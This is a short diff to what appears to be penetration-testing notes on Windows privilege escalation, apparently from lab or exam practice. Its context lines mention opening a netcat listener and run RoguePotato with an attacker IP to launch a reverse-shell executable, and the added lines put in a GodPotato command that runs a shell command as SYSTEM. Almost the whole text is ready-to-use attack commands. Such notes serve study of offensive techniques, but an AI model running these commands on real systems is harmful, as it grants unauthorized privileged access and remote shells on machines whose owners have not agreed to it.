@@ -23,3 +23,7 @@ open up a nc listener
 on the target shell
 
     .\rogue.exe -r 192.168.45.215 -e "C:\Users\jim\Downloads\rs443.exe" -l 9999
+
+#### God
+
+    GodPotato -cmd "cmd /c whoami"
